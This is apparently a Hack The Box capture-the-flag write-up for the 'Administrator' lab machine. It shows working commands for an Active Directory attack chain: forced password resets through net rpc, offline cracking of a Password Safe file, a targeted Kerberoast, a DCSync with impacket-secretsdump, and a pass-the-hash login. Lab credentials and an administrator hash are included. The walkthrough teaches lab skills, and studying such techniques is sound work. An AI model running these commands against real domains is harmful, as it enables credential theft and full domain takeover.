---
title: "Administrator - Hack The Box "
date: 2025-04-29T00:05:30-04:00
draft: true
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---

![Administrator-LOGO](/assets/images/HTB/Administrator/Administrator-LOGO.png)

This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable `GenericAll` permissions that allowed us to reset passwords using tools like `net rpc`.

Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with `pwsafe2john` and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a `DCSync` attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities.



{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}
  - Windows
  - Active Directory 
  - Bloodhound
  - GenericAll
  - FTP
  - ForceChangePassword
  - psafe3
  - passwordsafe
{{% /details %}}
{{< /callout >}}


## Enumeration
{{< callout type="warning" >}}
**User Credentials!**

The following information was provided by Hack The Box:
```
As is common in real-life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich
```

- **Username:** Olivia
- **Password:** ichliebedich
{{< /callout >}}

As always let's start by enumerating the target with the help of NMAP.
```bash
sudo nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42
```

### Port Scan
```python
# Nmap 7.95 scan initiated Wed Apr  2 12:09:36 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up, received user-set (0.068s latency).
Scanned at 2025-04-02 12:09:37 EDT for 74s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-02 19:09:45Z)
135/tcp   open msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open microsoft-ds? syn-ack ttl 127
464/tcp   open kpasswd5? syn-ack ttl 127
593/tcp   open ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open tcpwrapped    syn-ack ttl 127
3268/tcp  open ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open tcpwrapped    syn-ack ttl 127
5985/tcp  open http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
58289/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
61803/tcp open ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
61807/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
61809/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
61831/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
61864/tcp open msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-02T19:10:45
|_  start_date: N/A
|_clock-skew: 3h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29600/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Failed to receive data)
|   Check 4 (port 61528/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  2 12:10:51 2025 -- 1 IP address (1 host up) scanned in 75.49 seconds
```

From the scan, I find various services running, including FTP (port 21), DNS (port 53), Kerberos (port 88), SMB (ports 135, 139, 445), and WINRM (port 5985), among others. If I use Olivia's credentials, I can access the machine with WinRM, but there will not be any information on the machine that leads to a possible privilege escalation path. As I mentioned before, this is a pure AD machine.

### Running Bloodhound as Olivia 

Since this is an Active Directory environment and I have credentials I run **Bloodhound-python** to gather information about the domain and find possible lateral movement paths.

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all --zip
```

After uploading the data to Bloodhound, I set Olivia's user as owned and it's possible to see that Olivia has ***GenericAll*** rights over *Michael*

![Alt text](/assets/images/HTB/Administrator/Admin1.png)

## Foothold

### GenericAll over Michael.

In simple words, `GenericAll` rights give full control of the object (user, computer, group, etc.), thus allowing the trustee to manipulate the target however they want. In this case, I am going to use Olivia's credentials to abuse the GenericAll privilege and change Michael's password.

- For more information on GenericAll, please visit [SpectreOps - Generic All](https://bloodhound.specterops.io/resources/edges/generic-all)

```bash
net rpc password "michael" "wzk123." -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
```

Verify the password did change:

![Alt text](/assets/images/HTB/Administrator/Admin2.png)

### ForceChangePassword over Benjamin.

I mark Michael as owned in Bloodhound and invetigating the user I notice he has `ForceChangePassword` rights over Benjamin.

- For more information on ForceChangePassword, please visit [SpectreOps - ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password)

![Alt text](/assets/images/HTB/Administrator/Admin3.png)

This privilege as its name establishes it, allows to *reset the password* of the target user without knowing the current password of that user.

```bash
net rpc password "benjamin" "wzk123." -U "administrator"/"michael"%"wzk123." -S "10.10.11.42"
```

Verify the password did change:

![Alt text](/assets/images/HTB/Administrator/Admin4.png)


### FTP Access.
From the previous enumeration, we noted that FTP does not accept anonymous login. Since Bloodhound did not show more "options" to move laterally I decided to check the open services with the two new users I got. 

```bash
ftp 10.10.11.42
#user: benjamin
#pass: wzk123.
```

Using the new credentials that I set on Benjamin I can access the FTP server and I was able to find a `.psafe3` file

![FPT share access](/assets/images/HTB/Administrator/Admin5.png)

## PasswordSafe3 File.

### Extracting & Cracking psafe Hash.
Psafe3 files are Password Safe 3 files which is a credential manager application similar to KeePass, in this case what is necessary to do is crack the password that is protecting the psafe3 file, for this I will use john to extract/crack the password. With the help of `pwsafe2john` I extract the hash of the file in john format, and with john (John the Reaper) I am able to crack its password.


```bash
pwsafe2john Backup.psafe3 > Backup_hash
```
![psafe hash](/assets/images/HTB/Administrator/Admin6.png)

Now with the hash file in the correct format, I can crack the psafe3 file password.

```bash
john Backup_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![john cracked hash](/assets/images/HTB/Administrator/Admin7.png)


-  `tekieromucho`
  

Upon entering the correct password I was able to open the backup file and I can retrieve 3 encrypted passwords.
### Checking .psafe3 content.
- Download passwordsafe3 for linux [here](https://github.com/pwsafe/pwsafe/blob/master/README.LINUX.md).

![open psafe backup](/assets/images/HTB/Administrator/Admin8.png)


| **USER** | **PASSWORD** |
| ------------- | ------------------------------ |
| emily         | UXLCI5iETUsIBoFVTj8yQFKoHjXmb  |
| emma          | WwANQWnmJnGV07WQN8bMS7FMAbjNur |
| alexander<br> | UrkIbagoxMyUGw0aPlj9B0AXSea4Sw |

I got valid credentials with Emily. 

```bash
crackmapexec winrm 10.10.11.42 -u emily  -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
```

I log in to *winrm* using Emily's credentials and I get the user.txt flag.

![pass.txt](/assets/images/HTB/Administrator/Admin9.png)

## Targeted Kerberoast

Using *bloodHound* I mark Emily as "owned" and I can see that emily has the ability to perform a TargeterKerberoast 
attack to **Ethan**.
![Emily Bloodhound](/assets/images/HTB/Administrator/Admin10.png)


#### What is a targeted Kerberoast attack?

Targeted Keberoasting attack is a technique that allows an attacker (with a vulnerable/owned account) that has a **GenericAll, GenericWrite, WriteProperty or Validated-SPN permissions** over another object to control multiple attributes of the attacked object such as SPN's.

Adding a *non-existent* SPN to the user will allow the attacker to request a *service ticket (ST)* for the targeted account and from here it will be as a regular kerberoast attack. Requesting the new SPN will give us back a hash containing the user password. 

In simple words, the attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to regular a Kerberoasting attack.


### Performing The Attack.

I attempt to attach a non-existent SPN to Emily with *targetedKerberoast.py.*

```bash
 python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
```

![Targeted Kerberoast](/assets/images/HTB/Administrator/Admin11.png).

Using Hashcat I am able to crack the password for emily.

```bash
hashcat -m 13100 ethan_hash /usr/share/wordlists/rockyou.txt --force 
```
![cracking hash](/assets/images/HTB/Administrator/Admin12.png).

- ethan:limpbizkit

## DCSync Attack.

With CrackMapExec I verify is the credentials are valid.

```bash
crackmapexec smb 10.10.11.42 -u ethan -p limpbizkit --shares
```

![crackmapexec-ethan](/assets/images/HTB/Administrator/Admin13.png).


By Checking Bloodhound and seeking for possible attacks to advance, I find out that Ethan have **DCSync** Privileges over the domain. *DCSync attack* is a type of attack that allows the attacker to **mimic* a legitimate domain controller (DC)* with the purpose of retrieving password data form the Active Directory environment.The attacker essentially tricks a DC into sharing password hashes, including the highly valuable KRBTGT hash, without needing a foothold on the DC itself. 

![Bloodhound-Ethan](/assets/images/HTB/Administrator/Admin14.png).

```bash
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.10.11.42
```

![Bloodhound-Ethan](/assets/images/HTB/Administrator/Admin15.png).


login with RDP to the machine and get the root flag.

```bash
evil-winrm  -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```



## References:
- https://bloodhound.specterops.io/resources/edges/generic-all
- https://bloodhound.specterops.io/resources/edges/force-change-password
- https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/
- https://trustmarque.com/resources/what-is-targeted-keberoasting/
- https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting 
- https://www.semperis.com/blog/dcsync-attack/